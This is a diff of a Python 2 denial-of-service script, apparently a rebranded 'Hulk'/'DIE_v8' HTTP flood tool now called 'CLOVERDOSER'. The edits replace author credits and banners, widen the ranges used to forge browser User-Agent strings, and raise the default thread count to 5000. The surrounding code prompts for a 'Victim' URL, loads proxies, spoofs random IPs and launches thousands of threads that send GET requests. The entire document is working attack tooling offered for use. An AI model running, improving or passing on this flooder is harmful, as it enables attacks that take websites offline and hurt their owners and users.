@@ -1,6 +1,6 @@
-#!/usr/bin/env python
+#!/usr/bin/env python 
 #coding: utf-8
-#..:: > DIE_v8 < ::.. Mod By Phan
+#...:> CLOVERDOSER <:...
 
 import random
 import socket
@@ -15,7 +15,7 @@ import optparse
 import os
 import urlparse
 
-#Hulk Mod By JokerLjnk
+# Mod By CLOVERDOSER
 url=''
 host=''
 headers_useragents=[]
@@ -46,8 +46,8 @@ def getUserAgent():
         os  = random.choice(['Linux i686', 'Linux x86_64'])
     browser = random.choice(['chrome', 'firefox', 'ie'])
     if browser == 'chrome':
-        webkit = str(random.randint(500, 599))
-        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
+        webkit = str(random.randint(10000, 20000))
+        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 50000)) + '.' + str(random.randint(0, 49999))
         return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
     elif browser == 'firefox':
         currentYear = datetime.date.today().year
@@ -57,7 +57,7 @@ def getUserAgent():
             month = '0' + str(month)
         else:
             month = str(month)
-        day = random.randint(1, 30)
+        day = random.randint(1, 300)
         if day < 10:
             day = '0' + str(day)
         else:
@@ -178,7 +178,7 @@ class MonitorThread(threading.Thread):
 			if flag==2:
 				print ''
 
-#DIE_v8 Mod By Duong Thành
+#DIE_v8 Mod By CLOVERDOSER
 def randomIp():
     random.seed()
     result = str(random.randint(1, 254)) + '.' + str(random.randint(1, 254))
@@ -226,8 +226,8 @@ class attacco(threading.Thread):
                 proxy = random.choice(listaproxy).split(':')
 
 #Main
-print '\n\t..:: > Edit Code By Phan < ::..'
-print '\t  ==> #~~  Ddos Super ~~# <==  '
+print '\n\t..:: > Code Mod CLOVERDOSER < ::..'
+print '\t  ==>.:::CLOVERDOSER:::.<==  '
 # Site
 url = raw_input("Victim: ")
 host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
@@ -239,13 +239,13 @@ proxyf = in_file.read()
 in_file.close()
 listaproxy = proxyf.split('\n')
 #So luong
-thread = input("So luong (3000): ")
+thread = input("So luong (5000): ")
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
 accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
-print("\tDIE_v8 DDOS Edit By Phan")
+print("\CLOVERDOSER")
 if url.count("/")==2:
     url = url + "/"
     m = re.search('http\://([^/]*)/?.*', url)
@@ -253,7 +253,8 @@ if url.count("/")==2:
 for x in xrange(int(thread + 1)):
     attacco().start()
     time.sleep(0.003)
-print "Attacking ==========================>>"
+                         	
+print "Attacking <====> -_- <===>"         
 for x in xrange(501):
 	t = HTTPThread()
 	t.start()
